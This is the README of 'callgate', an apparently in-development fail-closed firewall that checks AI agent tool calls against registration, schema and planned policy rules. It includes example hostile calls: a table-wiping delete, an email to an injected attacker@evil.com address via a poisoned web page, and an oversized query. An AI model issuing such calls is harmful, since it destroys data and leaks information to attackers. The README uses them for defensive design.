# callgate

> **Fail-closed firewall for AI agent tool calls.**
> Structured outputs guarantee your agent's tool calls are *well-formed*. callgate guarantees they're *allowed*.

**Status: v0.2.0-dev. Phase 0 (core) in progress. Not released, not on PyPI yet.**

---

## The problem

Constrained decoding solved malformed JSON. It did nothing for this:

```python
delete_records(filter={})            # perfectly valid JSON. whole table gone.
send_email(to="attacker@evil.com")   # address injected via a poisoned web page
db_query(limit=10_000_000)           # schema-valid. production melts.
```

Every one of these is a **valid-but-wrong** call. Nothing in the platform stack blocks it.

## What callgate does

```
LLM tool call (OpenAI / Anthropic / Gemini native JSON, no custom format)
        │
        ▼
   ┌─ callgate ────────────────────────────────┐
   │  registered tool?  schema ok?  policy ok? │──BLOCK──► logged, never executed
   └───────────────┬───────────────────────────┘
                   ▼ ALLOW
              tool(**args)
```

```python
from callgate import Gate, Meter, ToolSchema

gate = Gate(default="deny", meter=Meter())     # fail closed, audit on
gate.register("db_query", db_query, schema=ToolSchema(required=["q"], types={"q": str, "limit": int}))

result = gate.run(openai_response)             # any provider shape, or a plain dict
# result.verdict: ALLOW | BLOCK. Blocked calls never execute
```

- **Zero required dependencies**: stdlib only, drops into any Python agent
- **Fail-closed**: unknown tool, schema violation, unparseable payload: blocked
- **Audit trail**: every verdict exported to JSON/CSV (`callgate report audit.json`)

**Honest status:** today's gate covers tool registration + schema (required args, types).
The policy engine that blocks *value-level* dangers from the examples above (empty
filters, out-of-range limits, non-allowlisted email domains) is the next cycle (see
roadmap). Claims will only ever match what the published failure suite proves.

Try it without an API key:

```bash
cd callgate && pip install -e . && python examples/quickstart.py
```

## Roadmap (Phase 0 → 1)

- [x] Provider intake (OpenAI chat + responses, Anthropic, Gemini, plain dict)
- [x] Fail-closed gate + schema layer + audit meter
- [ ] Policy engine: value constraints, allow/deny lists, approval flags, budget caps
- [ ] Failure-scenario suite (8 attack classes) with published block-rate per release
- [ ] Dry-run mode: full agent run, zero execution, "would-have-done" report
- [ ] `callgate-mcp`: guard proxy wrapping any MCP server
- [ ] PyPI release

## What happened to TOAP?

This repo used to be **TOAP**, a token-compression DSL for tool calls. We measured it honestly and killed it. The full postmortem (real numbers, tokenizer analysis, lessons) is on the [`toap-v0.1-archive`](https://github.com/Dev-Saif-Ops/Project_TOAP/tree/toap-v0.1-archive) branch. callgate keeps the part of TOAP that was never about compression: the fail-closed checkpoint between the model and your tools.

## License

MIT, see [LICENSE](LICENSE)

Built by [Mohammad Safwan Athar](https://github.com/Dev-Saif-Ops)
